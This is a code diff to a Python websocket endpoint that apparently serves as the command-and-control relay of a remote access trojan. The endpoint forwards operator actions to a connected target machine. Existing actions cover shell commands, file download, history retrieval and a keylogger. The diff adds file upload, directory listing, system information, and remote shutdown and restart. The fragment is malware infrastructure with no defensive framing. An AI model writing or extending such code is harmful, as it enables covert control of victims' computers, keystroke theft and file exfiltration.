@@ -84,10 +84,17 @@ async def websocket_endpoint(websocket: WebSocket):
                 payload["command"] = data.get("command")
             elif action == "download":
                 payload["path"] = data.get("path")
+            elif action == "upload":
+                payload["filename"] = data.get("filename")
+                payload["data"] = data.get("data")
+            elif action == "ls":
+                payload["path"] = data.get("path")
             elif action == "history":
                 payload["limit"] = data.get("limit")
             elif action == "keylogger":
                 payload["count"] = data.get("count")
+            elif action in ("systeminfo", "shutdown", "restart"):
+                pass
             try:
                 await target_ws.send_json(payload)
             except Exception:
